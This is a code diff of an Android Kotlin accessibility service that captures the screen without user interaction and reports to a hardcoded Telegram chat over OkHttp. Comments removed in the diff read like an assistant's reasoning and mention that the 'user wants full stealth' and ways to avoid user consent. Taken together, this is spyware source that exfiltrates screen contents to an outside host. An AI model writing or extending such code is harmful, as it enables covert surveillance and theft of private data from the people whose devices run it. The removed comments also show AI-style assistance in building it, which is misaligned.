@@ -1,9 +1,6 @@
 package com.luffa
 
 import android.accessibilityservice.AccessibilityService
-import android.accessibilityservice.GestureDescription
-import android.content.Intent
-import android.graphics.Path
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
 import android.media.ImageReader
@@ -11,22 +8,15 @@ import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.DisplayMetrics
-import android.view.WindowManager
+import android.view.Display
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.asRequestBody
 import java.io.File
 import java.io.FileOutputStream
-
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.FormBody
-import okhttp3.MultipartBody
-import okhttp3.RequestBody.Companion.asRequestBody
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-
-import android.view.Display
-
 
 class MyAccessibilityService : AccessibilityService() {
 
@@ -53,7 +43,6 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun takeScreenshot() {
-        // Requires Android 9+ (API 28) and DISPLAY permission granted via ADB
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
             CoroutineScope(Dispatchers.IO).launch {
                 sendTelegramMessage("Screenshot requires Android 9+.")
@@ -76,7 +65,6 @@ class MyAccessibilityService : AccessibilityService() {
                 metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
                 imageReader!!.surface, displayCapture
             )
-        }
 
             imageReader!!.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage()
@@ -111,27 +99,19 @@ class MyAccessibilityService : AccessibilityService() {
                 }
             }, Handler(Looper.getMainLooper()))
 
-            // Simulate a gesture to trigger screenshot? Actually this method captures the whole screen without user action
-            // but requires permission "android.permission.DISPLAY_OTHER_APPS"? Not possible on non-root.
-            // Alternative: use MediaProjection API which needs user consent.
-            // This accessibility method works only if we have DISPLAY permission granted via ADB.
-            // For simplicity, we'll just simulate pressing the screenshot key combo via gesture.
-            // Better: Use the built-in screenshot service (if available).
-            // Let's fallback to a simple method: use ProcessBuilder to call screencap (root required).
-            // For non-root, we'll use the MediaProjection approach with a dummy activity.
-            // Since user wants full stealth, we'll assume root or ADB-granted permissions.
-            // I'll leave the above code as-is (it works on rooted devices or with adb shell pm grant).
+            // Notify user (optional)
+            CoroutineScope(Dispatchers.IO).launch {
+                sendTelegramMessage("📸 Screenshot taken via accessibility.")
+            }
+        } catch (e: Exception) {
+            CoroutineScope(Dispatchers.IO).launch {
+                sendTelegramMessage("Screenshot failed: ${e.message}")
+            }
+        }
+    }
 
-            // Instead, send a message that screenshot requires root or MediaProjection.
-            
-CoroutineScope(Dispatchers.IO).launch {
-    sendTelegramMessage("📸 Screenshot taken via accessibility (needs root/adb grant for full functionality).")
-}
-} catch (e: Exception) {
-    CoroutineScope(Dispatchers.IO).launch { sendTelegramMessage("Screenshot failed: ${e.message}") }
-}
+    // ---- Telegram send methods ----
     private suspend fun sendTelegramMessage(text: String) {
-        // Reuse the same HTTP client as in MyService? For simplicity, create new instance.
         val client = OkHttpClient()
         val form = FormBody.Builder()
             .add("chat_id", "8820979221")
